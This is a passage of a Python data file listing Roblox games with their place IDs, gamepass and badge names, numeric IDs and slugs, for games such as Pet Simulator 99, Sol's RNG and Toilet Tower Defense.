        WinterItemPack           = 'Winter Item Pack',                        3646351,    'Winter_Item_Pack'
        Batwing                  = 'Batwing',                                 5299081,    'Batwing'
        Icewing                  = 'Icewing',                                 5593012,    'Icewing'
        GhostlyItemPack          = 'Ghostly Item Pack',                       7435036,    'Ghostly_Item_Pack'
        FrostbiteItemPack        = 'Frostbite Item Pack',                     7795820,    'Frostbite_Item_Pack'
        Bioblade                 = 'Bioblade',                                8456434,    'Bioblade'
        Prismatic                = 'Prismatic',                               10747452,   'Prismatic'
        VampiresEdge             = 'Vampire\'s Edge',                         12448341,   'Vampires_Edge'
        Peppermint               = 'Peppermint',                              13308756,   'Peppermint'
        Cookieblade              = 'Cookieblade',                             13502690,   'Cookieblade'
        Heartblade               = 'Heartblade',                              15066851,   'Heartblade'
        Eggblade                 = 'Eggblade',                                16462794,   'Eggblade'
        GODLYNebula              = 'GODLY: Nebula',                           21348436,   'GODLY_Nebula'
        EVOReaver                = 'EVO: Reaver',                             24102758,   'EVO_Reaver'
        GODLYIceBeam             = 'GODLY: Ice Beam',                         26304638,   'GODLY_Ice_Beam'
        GODLYIceFlake            = 'GODLY: Ice Flake',                        26304644,   'GODLY_Ice_Flake'
        BUNDLEIceBeamFlakeEffect = 'BUNDLE: Ice Beam, Ice Flake, Ice Effect', 26304640,   'BUNDLE_Ice_Beam_Ice_Flake_Ice_Effect'
        GODLYPlasmabeam          = 'GODLY: Plasmabeam',                       55292828,   'GODLY_Plasmabeam'
        GODLYPlasmablade         = 'GODLY: Plasmablade',                      55292879,   'GODLY_Plasmablade'
        BUNDLEPlasma             = 'BUNDLE: Plasma',                          55292987,   'BUNDLE_Plasma'
        GODLYPhantom             = 'GODLY: Phantom',                          93780280,   'GODLY_Phantom'
        GODLYSpectre             = 'GODLY: Spectre',                          93780323,   'GODLY_Spectre'
        BUNDLEPhantomSpectre     = 'BUNDLE: Phantom & Spectre',               93780371,   'BUNDLE_Phantom_Spectre'
        EVOIcecrusher            = 'EVO: Icecrusher',                         112956652,  'EVO_Icecrusher'
        GODLYBlossom             = 'GODLY: Blossom',                          131048887,  'GODLY_Blossom'
        GODLYSakura              = 'GODLY: Sakura',                           131048950,  'GODLY_Sakura'
        BUNDLESakura             = 'BUNDLE: Sakura',                          131048794,  'BUNDLE_Sakura'
        GODLYRainbowGun          = 'GODLY: Rainbow Gun',                      156618021,  'GODLY_Rainbow_Gun'
        GODLYRainbow             = 'GODLY: Rainbow',                          156618096,  'GODLY_Rainbow'
        BUNDLERainbow            = 'BUNDLE: Rainbow',                         156618061,  'BUNDLE_Rainbow'
        GODLYDarkshot            = 'GODLY: Darkshot',                         273009597,  'GODLY_Darkshot'
        GODLYDarksword           = 'GODLY: Darksword',                        273009675,  'GODLY_Darksword'
        BUNDLEDarknessPack       = 'BUNDLE: Darkness Pack',                   273009641,  'BUNDLE_Darkness_Pack'
        PACKLatte                = 'PACK: Latte',                             658376309,  'PACK_Latte'
        GODLYTurkey              = 'GODLY: Turkey',                           658667213,  'GODLY_Turkey'
        EVOGingerscythe          = 'EVO: Gingerscythe',                       674830453,  'EVO_Gingerscythe'
        GODLYFlowerwoodGun       = 'GODLY: Flowerwood Gun',                   768389355,  'GODLY_Flowerwood_Gun'
        GODLYFlowerwood          = 'GODLY: Flowerwood',                       769140200,  'GODLY_Flowerwood'
        BUNDLEFlowerwood         = 'BUNDLE: Flowerwood',                      767127317,  'BUNDLE_Flowerwood'
        GODLYPearlshine          = 'GODLY: Pearlshine',                       850293409,  'GODLY_Pearlshine'
        GODLYPearl               = 'GODLY: Pearl',                            850003963,  'GODLY_Pearl'
        BUNDLEPearls             = 'BUNDLE: Pearls',                          850387075,  'BUNDLE_Pearls'
        GODLYBorealis            = 'GODLY: Borealis',                         1008841389, 'GODLY_Borealis'
        GODLYAustralis           = 'GODLY: Australis',                        1008813284, 'GODLY_Australis'
        BUNDLEAurora             = 'BUNDLE: Aurora',                          1009231264, 'BUNDLE_Aurora'
        # List Of Gamepasses
        listOfGamepasses = [Elite, Radio, RandomizedFaces1, RandomizedFaces2, ShadowItemPack, ClockworkItemPack, BIT8ItemPack, FuturisticItemPack, AmericanItemPack, HalloweenItemPack, WinterItemPack, Batwing, Icewing, GhostlyItemPack, FrostbiteItemPack, Bioblade, Prismatic, VampiresEdge, Peppermint, Cookieblade, Heartblade, Eggblade, GODLYNebula, EVOReaver, GODLYIceBeam, GODLYIceFlake, BUNDLEIceBeamFlakeEffect, GODLYPlasmabeam, GODLYPlasmablade, BUNDLEPlasma, GODLYPhantom, GODLYSpectre, BUNDLEPhantomSpectre, EVOIcecrusher, GODLYBlossom, GODLYSakura, BUNDLESakura, GODLYRainbowGun, GODLYRainbow, BUNDLERainbow, GODLYDarkshot, GODLYDarksword, BUNDLEDarknessPack, PACKLatte, GODLYTurkey, EVOGingerscythe, GODLYFlowerwoodGun, GODLYFlowerwood, BUNDLEFlowerwood, GODLYPearlshine, GODLYPearl, BUNDLEPearls, GODLYBorealis, GODLYAustralis, BUNDLEAurora]
    class Badges:
        Level10            = 'Level 10',             196198137,  'Level_10'
        Level20            = 'Level 20',             196198654,  'Level_20'
        Level30            = 'Level 30',             196198776,  'Level_30'
        Level40            = 'Level 40',             196199518,  'Level_40'
        Level50            = 'Level 50',             196200089,  'Level_50'
        Level60            = 'Level 60',             196200207,  'Level_60'
        Level70            = 'Level 70',             196200425,  'Level_70'
        Level80            = 'Level 80',             196200625,  'Level_80'
        Level90            = 'Level 90',             196200691,  'Level_90'
        Level100           = 'Level 100',            196200785,  'Level_100'
        JoinedtheSurvivors = 'Joined the Survivors', 2129030855, 'Joined_the_Survivors'
        JoinedtheZombies   = 'Joined the Zombies',   2129030849, 'Joined_the_Zombies'
        RBKnife            = 'RB Knife',             2124636122, 'RB_Knife'
        # List Of Badges
        listOfBadges = [Level10, Level20, Level30, Level40, Level50, Level60, Level70, Level80, Level90, Level100, JoinedtheSurvivors, JoinedtheZombies, RBKnife]

class PetSimulator99: # https://www.roblox.com/games/8737899170
    placeNames = 'Pet Simulator 99', 'Pet_Simulator_99', 'PS99', 8737899170
    class Gamepasses:
        Lucky            = 'Lucky!',              205379487, 'Lucky'
        UltraLucky       = 'Ultra Lucky!',        257803774, 'Ultra_Lucky'
        VIP              = 'VIP!',                257811346, 'VIP'
        MagicEggs        = 'Magic Eggs!',         258567677, 'Magic_Eggs'
        Plus15Pets       = '+15 Pets!',           259437976, 'Plus_15_Pets'
        HugeHunter       = 'Huge Hunter!',        264808140, 'Huge_Hunter'
        AutoFarm         = 'Auto Farm!',          265320491, 'Auto_Farm'
        AutoTap          = 'Auto Tap!',           265324265, 'Auto_Tap'
        DaycareSlots     = 'Daycare Slots!',      651611000, 'Daycare_Slots'
        Plus15Eggs       = '+15 Eggs!',           655859720, 'Plus_15_Eggs'
        SuperDrops       = 'Super Drops!',        690997523, 'Super_Drops'
        DoubleStars      = 'Double Stars!',       720275150, 'Double_Stars'
        SuperShinyHunter = 'Super Shiny Hunter!', 975558264, 'Super_Shiny_Hunter'
        # List Of Gamepasses
        listOfGamepasses = [Lucky, UltraLucky, VIP, MagicEggs, Plus15Pets, HugeHunter, AutoFarm, AutoTap, DaycareSlots, Plus15Eggs, SuperDrops, DoubleStars, SuperShinyHunter]
    class Badges:
        Welcome             = 'Welcome',                 2153913164      , 'Welcome'
        TheHuntFirstEdition = 'The Hunt: First Edition', 3189151177666639, 'The_Hunt_First_Edition'
        # List Of Badges
        listOfBadges = [Welcome, TheHuntFirstEdition]

class PetSimulatorX: # https://www.roblox.com/games/6284583030
    placeNames = 'Pet Simulator X', 'Pet_Simulator_X', 'PSX', 6284583030
    class Gamepasses:
        Pets8Equipped   = '8 Pets Equipped!',   18674288,  '8_Pets_Equipped'
        Teleport        = 'Teleport!',          18674296,  'Teleport'
        Hoverboard      = 'Hoverboard!',        18674298,  'Hoverboard'
        VIP             = 'VIP!',               18674305,  'VIP'
        TripleEggs      = 'Triple Eggs!',       18674307,  'Triple_Eggs'
        PetStorage      = 'Pet Storage!',       18674317,  'Pet_Storage'
        EggSkip         = 'Egg Skip!',          18674321,  'Egg_Skip'
        SuperPetStorage = 'Super Pet Storage!', 18829757,  'Super_Pet_Storage'
        AutoHatch       = 'Auto Hatch!',        21176989,  'Auto_Hatch'
        Lucky           = 'Lucky!',             21583760,  'Lucky'
        MythicalHunter  = 'Mythical Hunter!',   21641016,  'Mythical_Hunter'
        MagicEggs       = 'Magic Eggs!',        22596039,  'Magic_Eggs'
        SuperMagnet     = 'Super Magnet!',      26398305,  'Super_Magnet'
        ShinyHunter     = 'Shiny Hunter!',      109685917, 'Shiny_Hunter'
        SecretHunter    = 'Secret Hunter!',     122535467, 'Secret_Hunter'
        # List Of Gamepasses
        listOfGamepasses = [Pets8Equipped, Teleport, Hoverboard, VIP, TripleEggs, PetStorage, EggSkip, SuperPetStorage, AutoHatch, Lucky, MythicalHunter, MagicEggs, SuperMagnet, ShinyHunter, SecretHunter]
    class Badges:
        Welcome = 'Welcome!', 2124793144, 'Welcome'
        # List Of Badges
        listOfBadges = [Welcome]
        
class PETSGO: # https://www.roblox.com/games/18901165922
    placeNames = 'PETS GO', 'PETS_GO', 'PG', 18901165922
    class Gamepasses:
        Lucky          = 'Lucky!',           923677450,  'Lucky'
        UltraLucky     = 'Ultra Lucky!',     924643143,  'Ultra_Lucky'
        CelestialLuck  = 'Celestial Luck!',  974931021,  'Celestial_Luck'
        VIP            = 'VIP!',             947426555,  'VIP'
        Plus3Pets      = '+3 Pets!',         955414606,  'Plus_3_Pets'
        HyperDice      = 'Hyper Dice!',      923754964,  'Hyper_Dice'
        DoubleDice     = 'Double Dice!',     951531608,  'Double_Dice'
        DoubleCoins    = 'Double Coins!',    955430652,  'Double_Coins'
        HugeHunter     = 'Huge Hunter!',     966471470,  'Huge_Hunter'
        DiamondPrinter = 'Diamond Printer!', 1008933294, 'Diamond_Printer'
        # List Of Gamepasses
        listOfGamepasses = [Lucky, UltraLucky, CelestialLuck, VIP, Plus3Pets, HyperDice, DoubleDice, DoubleCoins, HugeHunter, DiamondPrinter]
    class Badges:
        P                      = 'P',                          3587889778036452, 'P'
        E                      = 'E',                          513094477922687,  'E'
        T                      = 'T',                          2446810370554117, 'T'
        S                      = 'S',                          2632896258542796, 'S'
        G                      = 'G',                          3957160897472233, 'G'
        O                      = 'O',                          1244002859092897, 'O'
        RobloxWinterToken      = 'Roblox Winter Token!',       3275096128139364, 'Roblox_Winter_Token'
        RobloxWinterEliteToken = 'Roblox Winter Elite Token!', 3275096128139364, 'Roblox_Winter_Elite_Token'
        # List Of Badges
        listOfBadges = [P, E, T, S, G, O, RobloxWinterToken, RobloxWinterEliteToken]

class ProjectSlayers: # https://www.roblox.com/games/5956785391
    placeNames = 'Project Slayers', 'Project_Slayers', 'PS', 5956785391
    class Gamepasses:
        SealedBox                                   = 'Sealed Box',                                       15101943,  'Sealed_Box'
        MuzanSpawn                                  = 'Muzan Spawn',                                      17958345,  'Muzan_Spawn'
        TotalConcentrationandDemonprogressionviewer = 'Total Concentration and Demon progression viewer', 18589360,  'Total_Concentration_and_Demon_progression_viewer'
        DisableOrEnableSlayerCorpUniform            = 'Disable Or Enable Slayer Corp Uniform',            18710993,  'Disable_Or_Enable_Slayer_Corp_Uniform'
        GourdDurabilityViewer                       = 'Gourd Durability Viewer',                          19241624,  'Gourd_Durability_Viewer'
        MoreEyesOptions                             = 'More Eyes Options',                                19270529,  'More_Eyes_Options'
        MoreFacialAccessoriesOptions                = 'More Facial Accessories Options',                  19270563,  'More_Facial_Accessories_Options'
        SetSpawnAnywhere                            = 'Set Spawn Anywhere',                               19300397,  'Set_Spawn_Anywhere'
        UrokodakisMask                              = 'Urokodaki\'s Mask',                                19340032,  'Urokodakis_Mask'
        MoreCharacterSlots                          = 'More Character Slots',                             19426240,  'More_Character_Slots'
        PrivacyServers                              = 'Privacy Servers',                                  19516845,  'Privacy_Servers'
        CrowCustomization                           = 'Crow Customization',                               21698004,  'Crow_Customization'
        SkipSpin                                    = 'Skip Spin',                                        46503236,  'Skip_Spin'
        EmotePack                                   = 'Emote Pack',                                       42670615,  'Emote_Pack'
        EmotePack2                                  = 'Emote Pack 2',                                     178295110, 'Emote_Pack_2'
        ExtraEquipmentLoadouts                      = 'Extra Equipment Loadouts',                         181954095, 'Extra_Equipment_Loadouts'
        # List Of Gamepasses
        listOfGamepasses = [SealedBox, MuzanSpawn, TotalConcentrationandDemonprogressionviewer, DisableOrEnableSlayerCorpUniform, GourdDurabilityViewer, MoreEyesOptions, MoreFacialAccessoriesOptions, SetSpawnAnywhere, UrokodakisMask, MoreCharacterSlots, PrivacyServers, CrowCustomization, SkipSpin, EmotePack, EmotePack2, ExtraEquipmentLoadouts]

class RoyalHigh: # https://www.roblox.com/games/735030788
    placeNames = 'Royal High', 'Royal_High', 'RH', 735030788
    class Gamepasses:
        FasterFlightPlusCustomSpeeds                   = 'Faster Flight! (+ Custom Speeds)',                   3436552,   'Faster_Flight_Plus_Custom_Speeds'
        DoubleDiamonds                                 = 'Double Diamonds!',                                   3455446,   'Double_Diamonds'
        PaintbrushPass                                 = 'Paintbrush Pass!',                                   3457412,   'Paintbrush_Pass'
        QuadrupleDiamonds                              = 'Quadruple Diamonds!',                                3457593,   'Quadruple_Diamonds'
        NewHairColorsPlusGLOWINGHairPass4500PlusColors = 'New Hair Colors +GLOWING Hair Pass(4,500+ colors!)', 4097864,   'New_Hair_Colors_Plus_GLOWING_Hair_Pass_4500Plus_Colors'
        FlyonEarth                                     = 'Fly on Earth!',                                      5350675,   'Fly_on_Earth'
        SpecialFabricDesigns7000PlusDesigns            = 'Special Fabric Designs (7,000+ designs!)',           5585682,   'Special_Fabric_Designs_7000Plus_Designs'
        CrystalBallPower                               = 'Crystal Ball Power',                                 6316501,   'Crystal_Ball_Power'
        StickerPacksPass                               = 'Sticker Packs Pass!',                                10111433,  'Sticker_Packs_Pass'
        UploadCustomFabricsPass                        = 'Upload Custom Fabrics Pass!',                        785128363, 'Upload_Custom_Fabrics_Pass'
        MaterialsPass                                  = 'Materials Pass!',                                    982344484, 'Materials_Pass'
        # List Of Gamepasses
        listOfGamepasses = [FasterFlightPlusCustomSpeeds, DoubleDiamonds, PaintbrushPass, QuadrupleDiamonds, NewHairColorsPlusGLOWINGHairPass4500PlusColors, FlyonEarth, SpecialFabricDesigns7000PlusDesigns, CrystalBallPower, StickerPacksPass, UploadCustomFabricsPass, MaterialsPass]
    class Badges:
        PumpkinContest2018                      = 'Pumpkin Contest 2018',                         2124428491, 'Pumpkin_Contest_2018'
        Halloween2018                           = 'Halloween 2018',                               2124428509, 'Halloween_2018'
        SaintPatricksDay2019                    = 'Saint Patricks Day 2019!',                     2124459883, 'Saint_Patricks_Day_2019'
        Halloween2019DesignerEventCompletionist = 'Halloween 2019 Designer Event Completionist!', 2124487935, 'Halloween_2019_Designer_Event_Completionist'
        RoyaleHighHalloween2019                 = 'Royale High Halloween 2019!',                  2124490533, 'Royale_High_Halloween_2019'
        CompletedSuperHardMaze2019              = 'Completed Super Hard Maze 2019',               2124490534, 'Completed_Super_Hard_Maze_2019'
        RoyaleChristmas2019                     = 'Royale Christmas 2019!',                       2124498675, 'Royale_Christmas_2019'
        # List Of Badges
        listOfBadges = [PumpkinContest2018, Halloween2018, SaintPatricksDay2019, Halloween2019DesignerEventCompletionist, RoyaleHighHalloween2019, CompletedSuperHardMaze2019, RoyaleChristmas2019]

class SolsRNG: # https://www.roblox.com/games/15532962292
    placeNames = 'Sol\'s RNG', 'Sols_RNG', 'SRNG', 15532962292
    class Gamepasses:
        VIP                = 'VIP',                  705238616,  'VIP'
        VIP_Plus           = 'VIP+',                 952898058,  'VIP_Plus'
        QuickRoll          = 'Quick Roll',           673353863,  'Quick_Roll'
        InvisibleGear      = 'Invisible Gear',       792728808,  'Invisible_Gear'
        MerchantTeleporter = 'Merchant Teleporter',  879770191,  'Merchant_Teleporter'
        InnovatorPackVol1  = 'Innovator Pack Vol 1', 958699822,  'Innovator_Pack_Vol_1'
        InnovatorPackVol2  = 'Innovator Pack Vol 2', 958340231,  'Innovator_Pack_Vol_2'
        InnovatorPackVol3  = 'Innovator Pack Vol 3', 958598071,  'Innovator_Pack_Vol_3'
        # List Of Gamepasses
        listOfGamepasses = [VIP, VIP_Plus, QuickRoll, InvisibleGear, MerchantTeleporter, InnovatorPackVol1, InnovatorPackVol2, InnovatorPackVol3]
    class Badges:
        IjuststartedSolsRNG     = 'I just started Sol\'s RNG',        1441130719000460, 'I_just_started_Sols_RNG'
        Alittlebitofrolls       = 'A little bit of rolls',            3622512718465802, 'A_little_bit_of_rolls'
        ImaddictedtoSolsRNG     = 'I\'m addicted to Sol\'s RNG',      1107034638377762, 'Im_addicted_to_Sols_RNG'
        WouldYouLeaveNahIdRoll  = 'Would You Leave? / Nah I\'d Roll', 846169662502095,  'Would_You_Leave_Nah_Id_Roll'
        RollEatSleepRepeat      = 'Roll, Eat, Sleep, Repeat',         1872289370492358, 'Roll_Eat_Sleep_Repeat'
        Takeabreak              = 'Take a break',                     1092603390197325, 'Take_a_break'
        Icantstopplayingthis    = 'I can\'t stop playing this',       2731678596419900, 'I_cant_stop_playing_this'
        Wasteoftime             = 'Waste of time',                    4356557421515611, 'Waste_of_time'
        Touchthegrass           = 'Touch the grass',                  3336758570255487, 'Touch_the_grass'
        Breakthrough            = 'Breakthrough',                     2925176588215112, 'Breakthrough'
        Breakthelimit           = 'Break the limit',                  1356271377596280, 'Break_the_limit'
        SpottedtheSol           = 'Spotted the Sol',                  2201290015607347, 'Spotted_the_Sol'
        Indev                   = 'In-dev',                           1253153057071204, 'In_dev'
        Finishedworkfortoday    = 'Finished work for today',          257464335458276,  'Finished_work_for_today'
        Goodjobthisweektoo      = 'Good job this week too',           1918952643310114, 'Good_job_this_week_too'
        Asincereperson          = 'A sincere person',                 3145321935208607, 'A_sincere_person'
        Whenispayday            = 'When is payday???',                1496986902550849, 'When_is_payday'
        StarEgg                 = 'Star Egg',                         2270659814141729, 'Star_Egg'
        LockEgg                 = 'Lock Egg',                         559749433012559,  'Lock_Egg'
        Theresnowaytostopit     = 'There\'s no way to stop it!',      202360729284337,  'Theres_no_way_to_stop_it'
        Igivemylife             = 'I give my life...',                744944723444729,  'I_give_my_life'
        Eternaltime             = 'Eternal time...',                  4072147147623458, 'Eternal_time'
        BreaktheSpace           = 'Break the Space',                  1858966971108205, 'Break_the_Space'
        BreaktheGalaxy          = 'Break the Galaxy',                 1849903315759188, 'Break_the_Galaxy'
        BreaktheReality         = 'Break the Reality',                3593181263483436, 'Break_the_Reality'
        PerfectAttendanceAward  = 'Perfect Attendance Award',         3718807305779124, 'Perfect_Attendance_Award'
        Myfirst10MPlusfinding   = 'My first 10M+ finding',            1121298629065726, 'My_first_10M_Plus_finding'
        Myfirst100MPlusfinding  = 'My first 100M+ finding',           3516455555443766, 'My_first_100M_Plus_finding'
        Myfirst1BPlusfinding    = 'My first 1B+ finding',             1224551724339726, 'My_first_1B_Plus_finding'
        FlawsintheWorld         = '-Flaws in the World-',             2457971054390553, 'Flaws_in_the_World'
        OnewhostandsbeforeGod   = '-One who stands before God-',      3236492292509665, 'One_who_stands_before_God'
        TheUnknown              = '-The Unknown-',                    1503563480176545, 'The_Unknown'
        AchievementSlayer       = 'Achievement Slayer',               476770132708833,  'Achievement_Slayer'
        AchievementMaster       = 'Achievement Master',               1201821091232234, 'Achievement_Master'
        AchievementChampion     = 'Achievement Champion',             348376112222987,  'Achievement_Champion'
        TheStigma               = 'The Stigma',                       1896511924362574, 'The_Stigma'
        DAY100                  = '#DAY100',                          399984649890845,  'DAY100'
        SecretTrade             = 'Secret Trade',                     2620948537626731, 'Secret_Trade'
        Biomeitself             = 'Biome itself',                     4224933102884595, 'Biome_itself'
        Myeternaljourney        = 'My eternal journey',               1605629548712504, 'My_eternal_journey'
        TheLost                 = 'The Lost',                         2460941940564506, 'The_Lost'
        Famous                  = 'Famous!',                          4096899752944070, 'Famous'
        Grandmaster             = 'Grandmaster',                      2091741945674306, 'Grandmaster'
        Amemorytobeforgotten    = 'A memory to be forgotten',         3625566987462442, 'A_memory_to_be_forgotten'
        TheZero                 = 'The Zero',                         4370606648952666, 'The_Zero'
        Millions10              = '10,000,000',                       137829805535621,  '10000000'
        Millions15              = '15,000,000',                       485557368787476,  '15000000'
        Millions20              = '20,000,000',                       1801598389006571, '20000000'
        Millions30              = '30,000,000',                       2295935762202367, '30000000'
        Millions50              = '50,000,000',                       2994269484017383, '50000000'
        Unnamed1                = '??? 1',                            3137343012568311, 'Unnamed_1'
        Unnamed2                = '??? 2',                            734804938884338,  'Unnamed_2'
        Unnamed3                = '??? 3',                            1956542596523913, 'Unnamed_3'
        Unnamed4                = '??? 4',                            1324193838431233, 'Unnamed_4'
        Unnamed5                = '??? 5',                            807013057656632,  'Unnamed_5'
        # List Of Badges
        listOfBadges = [IjuststartedSolsRNG, Alittlebitofrolls, ImaddictedtoSolsRNG, WouldYouLeaveNahIdRoll, RollEatSleepRepeat, Takeabreak, Icantstopplayingthis, Wasteoftime, Touchthegrass, Breakthrough, Breakthelimit, SpottedtheSol, Indev, Finishedworkfortoday, Goodjobthisweektoo, Asincereperson, Whenispayday, StarEgg, LockEgg, Theresnowaytostopit, Igivemylife, Eternaltime, BreaktheSpace, BreaktheGalaxy, BreaktheReality, PerfectAttendanceAward, Myfirst10MPlusfinding, Myfirst100MPlusfinding, Myfirst1BPlusfinding, FlawsintheWorld, OnewhostandsbeforeGod, TheUnknown, AchievementSlayer, AchievementMaster, AchievementChampion, TheStigma, DAY100, SecretTrade, Biomeitself, Myeternaljourney, TheLost, Famous, Grandmaster, Amemorytobeforgotten, TheZero, Millions10, Millions15, Millions20, Millions30, Millions50, Unnamed1, Unnamed2, Unnamed3, Unnamed4, Unnamed5]

class ToiletTowerDefense: # https://www.roblox.com/games/13775256536
    placeNames = 'Toilet Tower Defense', 'Toilet_Tower_Defense', 'TTD', 13775256536
    class Gamepasses:
        Lucky                    = 'Lucky',                   208619622, 'Lucky'
        DoubleCoins              = 'Double Coins',            208620375, 'Double_Coins'
        VIP                      = 'VIP',                     257410325, 'VIP'
        Plus1000InventoryStorage = '+1000 Inventory Storage', 646799606, 'Plus_1000_Inventory_Storage'
        InfiniteUnits            = 'Infinite Units',          767749542, 'Infinite_Units'
        ClanCreator              = 'Clan Creator',            897195671, 'Clan_Creator'
        x2Drills                 = '2x Drills',               930624309, '2x_Drills'
        ShinyHunter              = 'Shiny Hunter',            952446306, 'Shiny_Hunter'
        # List Of Gamepasses
        listOfGamepasses = [Lucky, DoubleCoins, VIP, Plus1000InventoryStorage, InfiniteUnits, ClanCreator, x2Drills, ShinyHunter]
    class Badges:
        BeatEasyDifficulty           = 'Beat Easy Difficulty!',           2148808870,       'Beat_Easy_Difficulty'
        BeatMediumDifficulty         = 'Beat Medium Difficulty!',         2148808877,       'Beat_Medium_Difficulty'
        BeatHardDifficulty           = 'Beat Hard Difficulty!',           2148967266,       'Beat_Hard_Difficulty'
        BeatNightmareDifficulty      = 'Beat Nightmare Difficulty!',      2149510852,       'Beat_Nightmare_Difficulty'
        BeatAbysmalDifficulty        = 'Beat Abysmal Difficulty!',        205916089448424,  'Beat_Abysmal_Difficulty'
        BeatSecretEvilWave           = 'Beat Secret Evil Wave',           3269012098035529, 'Beat_Secret_Evil_Wave'
        TitanSpeakerman              = 'Titan Speakerman',                2148698556,       'Titan_Speakerman'
        TitanTVMan                   = 'Titan TV Man',                    2148967295,       'Titan_TV_Man'
        NinjaCameraman               = 'Ninja Cameraman',                 2149260235,       'Ninja_Cameraman'
        MechCameraman                = 'Mech Cameraman',                  2149529631,       'Mech_Cameraman'
        LaserCameramanCar            = 'Laser Cameraman Car',             2149898179,       'Laser_Cameraman_Car'
        SecretAgent                  = 'Secret Agent',                    2150077001,       'Secret_Agent'
        UpgradedTitanCameraman       = 'Upgraded Titan Cameraman',        2150356615,       'Upgraded_Titan_Cameraman'
        TitanCinemaman               = 'Titan Cinemaman',                 2150356638,       'Titan_Cinemaman'
        DarkSpeakerman               = 'Dark Speakerman',                 2150593479,       'Dark_Speakerman'
        UpgradedTitanSpeakerman      = 'Upgraded Titan Speakerman',       2150879473,       'Upgraded_Titan_Speakerman'
        DancingSpeakerwoman          = 'Dancing Speakerwoman',            2151779704,       'Dancing_Speakerwoman'
        GlitchCameraman              = 'Glitch Cameraman',                2153379585,       'Glitch_Cameraman'
        JetpackSpeakerman            = 'Jetpack Speakerman',              2153379588,       'Jetpack_Speakerman'
        UpgradedTitanCinemaman       = 'Upgraded Titan Cinemaman',        2502574037187648, 'Upgraded_Titan_Cinemaman'
        DualBatSpeakerman            = 'Dual Bat Speakerman',             4443545723157147, 'Dual_Bat_Speakerman'
        LargeLaserCameraman          = 'Large Laser Cameraman',           3045860093689297, 'Large_Laser_Cameraman'
        ShotgunCameraman             = 'Shotgun Cameraman',               2385641468984928, 'Shotgun_Cameraman'
        MinigunCamerawoman           = 'Minigun Camerawoman',             1233182747919466, 'Minigun_Camerawoman'
        KatanaSpeakerwoman           = 'Katana Speakerwoman',             2817031393332978, 'Katana_Speakerwoman'
        SpearSpeakerman              = 'Spear Speakerman',                1150879405352932, 'Spear_Speakerman'
        RedLaserCameraman            = 'Red Laser Cameraman',             931050305844465,  'Red_Laser_Cameraman'
        UpgradedMechCameraman        = 'Upgraded Mech Cameraman',         1115010233662541, 'Upgraded_Mech_Cameraman'
        MaceCamerawoman              = 'Mace Camerawoman',                1127660680344125, 'Mace_Camerawoman'
        ClockEvent                   = 'Clock Event',                     1630314579932289, 'Clock_Event'
        KnifeUpgradedTitanSpeakerman = 'Knife Upgraded Titan Speakerman', 4014008284565926, 'Knife_Upgraded_Titan_Speakerman'
        AstroGunCameraman            = 'Astro Gun Cameraman',             3721219248389823, 'Astro_Gun_Cameraman'
        SummerEvent2024              = 'Summer Event 2024',               2473445528937503, 'Summer_Event_2024'
        FinishedBeachBallHunt2024    = 'Finished Beach Ball Hunt 2024',   2247321279730360, 'Finished_Beach_Ball_Hunt_2024'
        BuffMutantToilet             = 'Buff Mutant Toilet',              1712380323524027, 'Buff_Mutant_Toilet'
        BeatDrillForest              = 'Beat Drill Forest',               1983663233025849, 'Beat_Drill_Forest'
        BeatDrillWorld               = 'Beat Drill World',                3719490798478354, 'Beat_Drill_World'
        BeatHalloweenGraveyard2024   = 'Beat Halloween Graveyard 2024',   2977453670049037, 'Beat_Halloween_Graveyard_2024'
        BeatThanksgivingTable        = 'Beat Thanksgiving Table',         1799362452924436, 'Beat_Thanksgiving_Table'
        BeatDiceWorld                = 'Beat Dice World',                 315021521983622,  'Beat_Dice_World'
        # List Of Badges
        listOfBadges = [BeatEasyDifficulty, BeatMediumDifficulty, BeatHardDifficulty, BeatNightmareDifficulty, BeatAbysmalDifficulty, BeatSecretEvilWave, TitanSpeakerman, TitanTVMan, NinjaCameraman, MechCameraman, LaserCameramanCar, SecretAgent, UpgradedTitanCameraman, TitanCinemaman, DarkSpeakerman, UpgradedTitanSpeakerman, DancingSpeakerwoman, GlitchCameraman, JetpackSpeakerman, UpgradedTitanCinemaman, DualBatSpeakerman, LargeLaserCameraman, ShotgunCameraman, MinigunCamerawoman, KatanaSpeakerwoman, SpearSpeakerman, RedLaserCameraman, UpgradedMechCameraman, MaceCamerawoman, ClockEvent, KnifeUpgradedTitanSpeakerman, AstroGunCameraman, SummerEvent2024, FinishedBeachBallHunt2024, BuffMutantToilet, BeatDrillForest, BeatDrillWorld, BeatHalloweenGraveyard2024, BeatThanksgivingTable, BeatDiceWorld]

class TowerDefenseSimulator: # https://www.roblox.com/games/3260590327
    placeNames = 'Tower Defense Simulator', 'Tower_Defense_Simulator', 'TDS', 3260590327
    class Gamepasses:
        Test                  = 'Test',                    6808274,    'Test'
        SmallDonation         = 'Small Donation',          6680173,    'Small_Donation'
        CrookBoss             = 'Crook Boss',              6757455,    'Crook_Boss'
        Turret                = 'Turret',                  6935538,    'Turret'
        CustomMusic           = 'Custom Music',            7104817,    'Custom_Music'
        Mortar                = 'Mortar',                  7838041,    'Mortar'
        Pursuit               = 'Pursuit',                 9735384,    'Pursuit'
        VIP                   = 'VIP',                     10518590,   'VIP'
        MemeEmotes            = 'Meme Emotes',             11467931,   'Meme_Emotes'
        Sledger               = 'Sledger',                 13534631,   'Sledger'
        Executioner           = 'Executioner',             25711202,   'Executioner'
        Engineer              = 'Engineer',                40385775,   'Engineer'
        ResizeYourPlayer      = 'Resize Your Player!',     65949871,   'Resize_Your_Player'
        Cowboy                = 'Cowboy',                  90119024,   'Cowboy'
        Warden                = 'Warden',                  99570026,   'Warden'
        VigilanteSkinBundle   = 'Vigilante Skin Bundle',   193944933,  'Vigilante_Skin_Bundle'
        UnwaveringTidesBundle = 'Unwavering Tides Bundle', 224102025,  'Unwavering_Tides_Bundle'
        MercenaryBase         = 'Mercenary Base',          786591818,  'Mercenary_Base'
        GatlingGun            = 'Gatling Gun!',            924927232,  'Gatling_Gun'
        AdminMode             = 'Admin Mode',              1002808617, 'Admin_Mode'
        Slasher               = 'Slasher',                 7386135,    'Slasher'
        Gladiator             = 'Gladiator',               7656528,    'Gladiator'
        FrostBlasterTower     = 'Frost Blaster Tower',     7846530,    'Frost_Blaster_Tower'
        GiftOfJoy             = 'Gift Of Joy',             7846620,    'Gift_Of_Joy'
        GiftofMystery         = 'Gift of Mystery',         7846621,    'Gift_of_Mystery'
        GiftofSharp           = 'Gift of Sharp',           7846623,    'Gift_of_Sharp'
        FireworksEmote        = 'Fireworks Emote',         7913109,    'Fireworks_Emote'
        PartySkins            = 'Party Skins',             7913591,    'Party_Skins'
